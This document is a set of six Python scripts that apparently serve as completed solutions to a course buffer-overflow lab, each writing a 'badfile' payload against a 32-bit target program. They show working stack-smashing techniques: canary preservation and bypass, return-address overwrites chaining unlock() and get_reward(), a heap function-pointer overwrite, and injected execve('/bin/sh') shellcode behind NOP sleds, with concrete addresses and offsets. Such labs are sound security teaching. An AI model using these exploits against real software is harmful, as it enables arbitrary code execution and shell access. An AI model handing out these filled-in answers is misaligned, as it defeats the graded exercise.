A1:
```py
#!/usr/bin/python3
import sys

def p32(x):
    """Pack a 32-bit integer in little-endian format."""
    return x.to_bytes(4, byteorder='little')

# ============================================================
# TODO: Fill in the values below based on your GDB analysis
# ============================================================

# Your Student ID (last 3 digits)
STUDENT_ID = 4               # TODO: Replace with your ID

# Canary value (derived from Student ID)
CANARY_VAL = 0xDEAD0000 + STUDENT_ID + 16

# Addresses (found via GDB)
username_addr = 0x565590c0    # TODO: p &username
canary_addr = 0x565590a0      # TODO: p &canary_guard
profile_addr = 0x56559040     # TODO: p &profile
access_code_addr = 0x56559080 # TODO: p &access_code

# ============================================================
# Understanding the Null-Byte Problem
# ============================================================
# CANARY_VAL in little-endian contains a \x00 byte (2nd byte).
# strcpy() stops copying at \x00, so you CANNOT write past
# the canary in a single overflow!
#
# Solution: Use the TWO strcpy() calls in the program.
#
# Stage 1 — strcpy(username, line1):
#   Overflow username up to the canary. strcpy's null terminator
#   naturally lands on the canary's \x00 byte, preserving it.
#   But you CANNOT reach access_code past the canary.
#
# Stage 2 — strcpy(profile, line2):
#   profile sits AFTER the canary. Overflow profile into
#   access_code to write "UNLOCK". The canary is not in the way.
#
# Your badfile must have TWO LINES separated by \n.
# ============================================================

# Gaps (calculate from GDB addresses)
gap1 = 32  # TODO: canary_addr - username_addr
gap2 = 64  # TODO: access_code_addr - profile_addr

# ============================================================
# Construct the payload (two lines)
# ============================================================

# Stage 1: overflow username, preserve canary
# "admin" + padding + first_canary_byte
canary_byte0 = CANARY_VAL & 0xFF # (the low byte)
padding1_size = gap1 - len("admin")

line1 = b"admin" + b"A" * padding1_size + bytes([canary_byte0])

# Stage 2: overflow profile into access_code
# padding2_size = gap2 - len("some_profile_data")


# line2 = b"B" * padding2_size + b"UNLOCK"
line2 = b"B" * gap2 + b"UNLOCK"

# Combine with newline separator
payload = line1 + b"\n" + line2 + b"\n"

# ============================================================
# Write the payload to badfile
# ============================================================
with open('badfile', 'wb') as f:
    f.write(payload)

print("badfile generated successfully!")

```
A2:
```py
#!/usr/bin/python3
import sys

def p32(x):
    """Pack a 32-bit integer in little-endian format."""
    return x.to_bytes(4, byteorder='little')

# ============================================================
# TODO: Fill in the values below based on your GDB analysis
# ============================================================

# Your Student ID (last 3 digits)
STUDENT_ID = 4               # TODO: Replace with your ID

# Unlock code (derived from your Student ID)
UNLOCK_CODE = 0xA5A5A000 + STUDENT_ID

# Addresses — printed by the target program
unlock_addr = 0x5655628d     # TODO: Replace with unlock() address
get_reward_addr = 0x565562f6 # TODO: Replace with get_reward() address

# Offset from buffer start to return address
# Use GDB: offset = ($ebp - &buffer) + 4
offset = 76                   # TODO: Replace with actual offset

# Total size of the payload (should match READ_SZ in target.c)
read_sz = 264                  # TODO: Replace with your READ_SZ value

# ============================================================
# Construct the payload
# ============================================================

content = bytearray(0x41 for i in range(read_sz))

# TODO: Chain the function calls on the stack:
#
# Step 1: Overwrite return address with unlock()
content[offset:offset+4] = p32(unlock_addr)
#
# Step 2: Set unlock()'s return address to get_reward()
content[offset+4:offset+8] = p32(get_reward_addr)
#
# Step 3: Place UNLOCK_CODE as the argument to unlock()
content[offset+8:offset+12] = p32(UNLOCK_CODE)

# ============================================================
# Write the payload to badfile
# ============================================================
with open('badfile', 'wb') as f:
    f.write(content)

print("badfile generated successfully!")

```
B1:
```py
#!/usr/bin/python3
import sys

def p32(x):
    """Pack a 32-bit integer in little-endian format."""
    return x.to_bytes(4, byteorder='little')

# ============================================================
# TODO: Fill in the values below based on your GDB analysis
# ============================================================

# Your Student ID (last 3 digits)
STUDENT_ID = 4               # TODO: Replace with your ID

# Token value (derived from Student ID)
TOKEN = 1000 + STUDENT_ID * 7

# Address of validate() — printed by the target program
validate_addr = 0x5655626d   # TODO: Replace

# ============================================================
# TODO: Write your custom shellcode
# ============================================================
# Your shellcode must:
#   1. Push TOKEN onto the stack
#   2. Call validate() at validate_addr
#   3. Spawn /bin/sh using execve syscall
#
# Use https://defuse.ca/online-x86-assembler.htm#disassembly
# to convert your assembly to hex bytes.
#
# Example assembly structure:

# xor eax, eax
# mov ax, 0x0404
# push eax
# mov ebx, 0x5655626d
# call ebx
# xor eax, eax
# push eax
# push 0x68732f2f
# push 0x6e69622f
# mov ebx, esp
# push eax
# push ebx
# mov ecx, esp
# cdq
# mov al, 0x0b
# int 0x80

shellcode = b"\x31\xC0\x66\xB8\x04\x04\x50\xBB\x6D\x62\x55\x56\xFF\xD3\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\x99\xB0\x0B\xCD\x80"  # TODO: Replace with your shellcode bytes

# ============================================================
# TODO: Construct the payload
# ============================================================

# Total size of the payload
read_sz = 384                  # TODO: Replace with your READ_SZ

# Offset from buffer to return address
offset = 96                   # TODO: Replace with actual offset

# Return address — should point to where your shellcode is placed
buffer_addr = 0xffffd2ec
jump_offset = 200
ret_addr = buffer_addr + jump_offset        # TODO: Replace

content = bytearray(0x90 for i in range(read_sz))  # 0x90 is NOP
content[-1] = 0x00

# TODO: Place shellcode and return address in the payload
# Strategy: 
# 1. Place shellcode at the end of the payload
start = read_sz - len(shellcode) - 1
content[start:start+len(shellcode)] = shellcode
# 2. Overwrite the return address
content[offset:offset+4] = p32(ret_addr)

# ============================================================
# Write the payload to badfile
# ============================================================
with open('badfile', 'wb') as f:
    f.write(content)

print("badfile generated successfully!")

```
B2:
```py
#!/usr/bin/python3
import sys

def p32(x):
    """Pack a 32-bit integer in little-endian format."""
    return x.to_bytes(4, byteorder='little')

# ============================================================
# Shellcode for opening shell
# ============================================================
shellcode = (
    "\x31\xc0"          # xor    eax, eax
    "\x50"              # push   eax
    "\x68""//sh"        # push   0x68732f2f
    "\x68""/bin"        # push   0x6e69622f
    "\x89\xe3"          # mov    ebx, esp
    "\x50"              # push   eax
    "\x53"              # push   ebx
    "\x89\xe1"          # mov    ecx, esp
    "\x99"              # cdq
    "\xb0\x0b"          # mov    al, 0x0b
    "\xcd\x80"          # int    0x80
).encode('latin-1')

# ============================================================
# TODO: Fill in the values below based on your GDB analysis
# ============================================================

# Your Student ID (last 3 digits, no leading zeroes)
STUDENT_ID = 4               # TODO: Replace with your ID

READ_SZ = 80 + 200 + STUDENT_ID

# ============================================================
# Canary value — computed at runtime by init_canary().
# You CANNOT compute this from the source code alone.
# You MUST read it from GDB:
#   (gdb) b vuln
#   (gdb) run
#   (gdb) p canary_seed
# ============================================================
canary_val = 0x754f7ddd       # TODO: Replace with value from GDB

# Buffer address (from GDB: p &buffer)
buffer_addr = 0xffffd348      # TODO: Replace

# Offset from buffer to canary (from GDB: p &canary - p &buffer)
canary_offset = 84             # TODO: Replace

# Offset from buffer to return address (from GDB: $ebp - &buffer + 4)
ret_offset = 100                # TODO: Replace

# ============================================================
# Shellcode — you must find or write a null-byte-free shellcode
# that spawns /bin/sh. strcpy() stops at \x00, so your entire
# payload (including shellcode) must be null-byte-free.
# ============================================================

# ============================================================
# Construct the payload
# ============================================================
# We have a total of READ_SZ (284) bytes. 
# Layout:
# [ NOPs ] [ CANARY ] [ NOPs ] [ ret_addr ] [ MASSIVE NOP SLED ] [ shellcode ] [\x00]

payload = bytearray(0x90 for i in range(READ_SZ))

# 1. Place the canary
payload[canary_offset:canary_offset+4] = p32(canary_val)

# 2. Place the shellcode at the very end (just before the null terminator)
sc_start = READ_SZ - len(shellcode) - 1
payload[sc_start:sc_start+len(shellcode)] = shellcode

# 3. Place the return address. 
# Point it deep into the massive NOP sled *after* the return address
# buffer_addr + 150 is extremely safe and gives you ~100 bytes of leeway!
ret_addr = buffer_addr + 150
payload[ret_offset:ret_offset+4] = p32(ret_addr)

# 4. Null terminator to stop strcpy()
payload[-1] = 0x00

# ============================================================
# Write the payload to badfile
# ============================================================
with open('badfile', 'wb') as f:
    f.write(payload)

print("badfile generated successfully!")


```
C1:
```py
#!/usr/bin/python3

def p32(x):
    """Pack a 32-bit integer in little-endian format."""
    return x.to_bytes(4, byteorder="little", signed=False)


# 24-byte Linux/x86 execve("/bin//sh", ...) shellcode
shellcode = (
    "\x31\xc0"
    "\x50"
    "\x68" "//sh"
    "\x68" "/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x99"
    "\xb0\x0b"
    "\xcd\x80"
).encode("latin-1")


student_id = 4

buf_sz = 100 + student_id
read_sz = buf_sz + 300

# Fill the payload with NOP instructions.
content = bytearray([0x90] * read_sz)

# fread() does not append '\0', but strcpy() requires one.
# Reserve the final byte as the string terminator.
content[-1] = 0x00

# Put the shellcode immediately before the terminating NUL.
start = read_sz - 1 - len(shellcode)
content[start:start + len(shellcode)] = shellcode

# These two values must come from this exact compiled binary.
buffer_address = 0xffffd2a8
return_address_offset = 116

# Must be after the overwritten saved return address and before
# the shellcode.
landing_offset = 200

ret = buffer_address + landing_offset
packed_ret = p32(ret)

# Sanity checks
assert len(shellcode) == 24
assert len(content) == read_sz
assert return_address_offset + 4 <= landing_offset < start
assert b"\x00" not in packed_ret, (
    "Return address contains a NUL byte; strcpy() will stop early"
)

# Overwrite saved EIP.
content[return_address_offset:(return_address_offset + 4)] = packed_ret

with open("badfile", "wb") as f:
    f.write(content)

print(f"Payload size:       {len(content)}")
print(f"Shellcode length:   {len(shellcode)}")
print(f"Shellcode offset:   {start}")
print(f"Saved EIP offset:   {return_address_offset}")
print(f"Landing offset:     {landing_offset}")
print(f"Return address:     0x{ret:08x}")
print(f"Return bytes:       {packed_ret.hex()}")
print("badfile generated successfully")

```
C2:
```py
#!/usr/bin/python3
import sys

def p32(x):
    """Pack a 32-bit integer in little-endian format."""
    return x.to_bytes(4, byteorder='little')

# ============================================================
# TODO: Fill in the values below based on your GDB analysis
# ============================================================

# Address of secret_action() — printed by the target program
secret_action_addr = 0x5655629c   # TODO: Replace

# Offset from user->name to handler->action
offset = 96                        # TODO: Replace

# ============================================================
# TODO: Construct the payload
# ============================================================

payload = b"A" * offset + p32(secret_action_addr)

# ============================================================
# Write the payload to badfile
# ============================================================
with open('badfile', 'wb') as f:
    f.write(payload)

print("badfile generated successfully!")

```